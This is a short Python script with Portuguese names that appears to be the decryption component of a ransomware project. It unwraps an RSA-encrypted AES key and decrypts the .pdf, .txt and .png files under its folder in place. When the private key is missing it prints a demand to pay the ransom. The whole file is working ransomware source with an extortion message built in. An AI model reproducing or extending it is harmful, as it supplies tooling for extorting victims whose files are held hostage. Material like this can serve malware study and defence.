
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def get_chave(caminho_diretorio):

    nome_chave = 'chave_AES.key'
    
    caminho_chave = os.path.join(caminho_diretorio, nome_chave)

    if os.path.exists(caminho_chave):
        with open(caminho_chave, 'rb') as chave:
            conteudo_chave = chave.read()
            print('Chave encontrada e carregada')
            return conteudo_chave
    else:
        print('Chave nao encontrada, falha em carregar')
    pass

def descriptografa(chave_AES, caminho_diretorio):
    extensoes = ('.pdf', '.txt', '.png')
    
    for diretorio, pastas, arquivos in os.walk(caminho_diretorio):
        for arquivo in arquivos:
            if arquivo.endswith(extensoes):

                caminho_arquivo_criptografado = os.path.join(diretorio, arquivo)

                with open(caminho_arquivo_criptografado, 'rb') as file_cript:
                    iv = file_cript.read(16)
                    conteudo = file_cript.read()
                
                cifra = AES.new(chave_AES, AES.MODE_CBC, iv)
                conteudo_descri = cifra.decrypt(conteudo)
                conteudo_desp = unpad(conteudo_descri, AES.block_size)

                with open(caminho_arquivo_criptografado, 'wb') as file_decript:
                    file_decript.write(conteudo_desp)
                print(f'Conteudo de {caminho_arquivo_criptografado} foi descriptografado')

def descriptografa_chave(caminho_diretorio):
    caminho_chave = os.path.join(caminho_diretorio, 'chave_AES.key')
    caminho_privada = os.path.join(caminho_diretorio, 'private.key')

    if os.path.exists(caminho_privada):
        with open(caminho_privada, 'rb') as file:
            chave_privada = RSA.import_key(file.read())

        cifra_rsa = PKCS1_OAEP.new(chave_privada)

        with open(caminho_chave, 'rb') as file:
            conteudo_chave_aes = file.read()
        
        descriptografado = cifra_rsa.decrypt(conteudo_chave_aes)

        with open(caminho_chave, 'wb') as file:
            file.write(descriptografado)
    else:
        print('Voce ainda nao recebeu a chave RSA, pague o resgate!')
        exit()


caminho_arquivo = os.path.abspath(__file__)
caminho_diretorio = os.path.dirname(caminho_arquivo)

descriptografa_chave(caminho_diretorio)

chave_AES = get_chave(caminho_diretorio)

descriptografa(chave_AES, caminho_diretorio)
